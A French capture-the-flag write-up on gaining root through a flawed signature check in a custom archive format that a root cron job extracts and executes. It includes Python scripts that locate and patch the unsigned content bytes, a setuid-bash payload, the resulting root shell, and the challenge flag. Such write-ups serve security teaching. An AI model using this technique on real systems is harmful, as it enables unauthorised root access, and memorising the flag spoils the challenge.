# Write-up -- Archives à couches multiples (2/3)

## Contexte

On se connecte en SSH sur l'instance avec les identifiants `admin:admin`. L'objectif est d'obtenir un accès `root`.

## Énumération

En fouillant le répertoire personnel, on trouve une archive `update.mla` :

```bash
admin@admin:~$ find / -iname "*mla*" -not -path "/proc/*" 2>/dev/null
/etc/cron.d/mla-updater
/home/admin/update.mla
```

Une tâche cron attire immédiatement l'attention :

```bash
admin@admin:~$ cat /etc/cron.d/mla-updater
* * * * * root /usr/local/bin/python3 -u /usr/local/bin/updater.py >> /var/log/updater.log 2>&1
```

Cette tâche est exécutée **toutes les minutes en tant que root**. C'est notre piste d'escalade de privilèges : si on peut faire exécuter du code arbitraire par `updater.py`, on obtient un shell root.

## Analyse du script `updater.py`

Le script :
1. Charge une clé publique Ed25519 (`nacl.signing.VerifyKey`).
2. Calcule un hash SHA512 personnalisé sur l'archive `update.mla`.
3. Vérifie la signature Ed25519 stockée en fin d'archive par rapport à ce hash.
4. Si la signature est valide, extrait et exécute le script `update.sh` contenu dans l'archive, avec les droits root.

Le point clé se trouve dans la fonction `calculate_hash` :

```python
def calculate_hash(f):
    hasher = hashlib.sha512()
    hasher.update(f.read(13))
    hasher.update(f.read(9))
    while True:
        magic = f.read(4)
        if not magic or magic != ARCHIVE_ENTRY_BLOCK_MAGIC: break
        block_type = f.read(1)[0]
        hasher.update(magic)
        hasher.update(bytes([block_type]))

        if block_type == BLOCK_TYPE_ENTRY_START:
            data = f.read(16)
            hasher.update(data)
            name_len = struct.unpack('<Q', data[8:16])[0]
            hasher.update(f.read(name_len))
            hasher.update(f.read(1))
        elif block_type == BLOCK_TYPE_ENTRY_CONTENT:
            data = f.read(17)
            hasher.update(data)
            content_len = struct.unpack('<Q', data[9:17])[0]
            f.seek(content_len, 1)   # <-- le contenu est SAUTÉ, jamais hashé !
        elif block_type == BLOCK_TYPE_END_OF_ENTRY:
            hasher.update(f.read(41))   # 41 octets bruts, sans validation de hash interne
        elif block_type == BLOCK_TYPE_END_OF_ARCHIVE:
            break
    ...
```

## Vulnérabilité

En analysant précisément ce que hash la fonction :

- Pour un bloc `BLOCK_TYPE_ENTRY_CONTENT`, seuls les **17 octets de métadonnées** (ID d'entrée + taille du contenu) sont hashés. Le contenu réel de l'entrée est lu avec `f.seek(content_len, 1)`, donc **sauté sans jamais être intégré au hash**.
- Pour un bloc `BLOCK_TYPE_END_OF_ENTRY`, 41 octets bruts sont hashés sans qu'aucun hash interne du contenu ne soit vérifié.

**Conclusion : la signature Ed25519 protège uniquement la structure/métadonnées de l'archive (noms, tailles, ordre des blocs), mais jamais les octets réels du contenu des fichiers.**

Cela signifie qu'on peut remplacer le contenu de `update.sh` par n'importe quel payload arbitraire, **tant que sa longueur en octets reste strictement identique** à la valeur `content_len` déclarée dans les métadonnées (puisque c'est cette taille, et non le contenu, qui est signée).

## Exploitation

### Étape 1 - Localiser l'offset et la taille exacte du contenu

```python
#!/usr/bin/env python3
import struct

PATH = "/home/admin/update.mla"

with open(PATH, "rb") as f:
    data = f.read()

pos = 22  # header = 13 + 9 octets, comme dans updater.py
while pos < len(data):
    magic = data[pos:pos+4]
    if magic != b"MAEB":
        break
    block_type = data[pos+4]
    pos += 5
    if block_type == 0x00:  # ENTRY_START
        entry_id = struct.unpack('<Q', data[pos:pos+8])[0]
        name_len = struct.unpack('<Q', data[pos+8:pos+16])[0]
        name = data[pos+16:pos+16+name_len].decode()
        pos += 16 + name_len + 1
        print(f"[START]   id={entry_id} name={name}")
    elif block_type == 0x01:  # ENTRY_CONTENT
        entry_id = struct.unpack('<Q', data[pos:pos+8])[0]
        content_len = struct.unpack('<Q', data[pos+9:pos+17])[0]
        content_offset = pos + 17
        print(f"[CONTENT] id={entry_id} offset={content_offset} len={content_len}")
        print(f"          contenu actuel: {data[content_offset:content_offset+content_len]!r}")
        pos = content_offset + content_len
    elif block_type == 0xFF:  # END_OF_ENTRY
        pos += 41
    elif block_type == 0xFE:  # END_OF_ARCHIVE
        break
```

Résultat :

```
[START]   id=0 name=update.sh
[CONTENT] id=0 offset=75 len=69
          contenu actuel: b"#!/bin/bash\necho 'Mise \xc3\xa0 jour en cours...'\necho 'Syst\xc3\xa8me \xc3\xa0 jour.'\n"
```

Le script `update.sh` légitime commence à l'offset **75** et fait exactement **69 octets**.

### Étape 2 - Patcher le contenu sans casser la signature

On remplace le contenu par un payload malveillant de même longueur (en le complétant avec des `#` pour respecter exactement les 69 octets) :

```python
#!/usr/bin/env python3

PATH = "/home/admin/update.mla"
OFFSET = 75
LENGTH = 69

payload = b"#!/bin/bash\nchmod u+s /bin/bash\n"
assert len(payload) <= LENGTH, "Payload trop long"
payload += b"#" * (LENGTH - len(payload))

with open(PATH, "r+b") as f:
    f.seek(OFFSET)
    f.write(payload)

print("Patché.")
```

Le payload donne le bit **setuid** au binaire `/bin/bash`, ce qui permettra d'obtenir un shell root persistant.

### Étape 3 - Attendre l'exécution du cron et escalader

Une minute plus tard, le cron root exécute `updater.py`. Comme seule la structure de l'archive est signée (et inchangée), la vérification Ed25519 passe toujours, et notre `update.sh` malveillant est exécuté en tant que root :

```bash
admin@admin:/tmp$ bash -p
bash-5.2# cd /root
bash-5.2# ls
flag.txt
bash-5.2# cat flag.txt
SHLK{D0n7_r3inv3n7_7h3_wh33l_82093492340324}
```

## Conclusion

La vulnérabilité provient d'une implémentation incomplète de la vérification de signature : le format MLA custom hash uniquement les métadonnées de structure (noms, IDs, tailles) et jamais le contenu réel des fichiers. Il est donc possible de falsifier le contenu d'une entrée sans invalider la signature Ed25519, **tant que la taille en octets reste identique**. Combiné à un cron root exécutant le contenu extrait, cela permet une escalade de privilèges complète.
